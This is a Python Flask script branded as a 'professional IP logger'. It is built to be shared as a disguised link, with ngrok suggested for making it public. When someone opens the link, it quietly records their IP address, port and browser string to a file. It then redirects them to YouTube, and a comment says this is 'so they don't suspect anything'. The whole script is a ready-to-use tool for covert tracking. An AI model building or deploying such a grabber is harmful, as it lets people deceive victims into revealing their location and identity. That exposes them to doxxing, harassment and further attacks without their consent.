import os
import time
import sys
from flask import Flask, request

# --- Color Definitions ---
G, Y, C, R, W, B = '\033[92m', '\033[93m', '\033[96m', '\033[91m', '\033[0m', '\033[1m'

app = Flask(__name__)

def show_banner():
    os.system('clear')
    banner = f"""
{C}{B}  _   _  _______   _____    _____ ______ _____ _    _ 

 | \ | | | ____\ \ / / _ \  |_   _|  ____/ ____| |  | |
 |  \| | | |__   \ V / | | |   | | | |__ | |    | |__| |
 | . ` | |  __|   > <| | | |   | | |  __|| |    |  __  |
 | |\  | | |____ / . \ |_| |  _| |_| |___| |____| |  | |
 |_| \_| |______/_/ \_\___/  |_____|______\_____|_|  |_|
{W}
 {G}=======================================================
 {Y}  TOOL:        {W}PROFESSIONAL IP LOGGER
 {Y}  CREATED BY:  {W}NEXO TECH
 {Y}  INSPIRED BY: {W}DEMON ALEX && BLUEY
 {G}=======================================================
    """
    print(banner)

def typing_effect(text, speed=0.03):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)
    print()

@app.route('/')
def logger():
    # Capture Data
    user_ip = request.remote_addr
    user_port = request.environ.get('REMOTE_PORT')
    user_agent = request.headers.get('User-Agent')
    timestamp = time.strftime('%H:%M:%S')

    # Print Live Alert to Terminal
    print(f"\n{R}[!] ALERT: NEW CONNECTION DETECTED{W}")
    print(f"{G}┌─[ TIME: {timestamp} ]")
    print(f"├─ IP   : {Y}{user_ip}{G}")
    print(f"├─ PORT : {Y}{user_port}{G}")
    print(f"└─ OS   : {W}{user_agent[:50]}...") # Shortened for clean look

    # Save to a file automatically
    with open("captured_ips.txt", "a") as f:
        f.write(f"[{timestamp}] IP: {user_ip} | Port: {user_port} | UA: {user_agent}\n")

    # Redirect to a real site so they don't suspect anything
    return f"<html><script>window.location.replace('https://www.youtube.com');</script></html>"

if __name__ == "__main__":
    show_banner()
    typing_effect(f"{C}[*] Booting NEXO Log Modules...{W}")
    time.sleep(1)
    typing_effect(f"{C}[*] Server starting on PORT 8080...{W}")
    print(f"{G}[+] Status: ONLINE & LISTENING{W}\n")
    
    # Run the server
    # Note: Inside Termux, this is local. You need 'ngrok' to make it a public link.
    app.run(host='0.0.0.0', port=8080, debug=False)
	
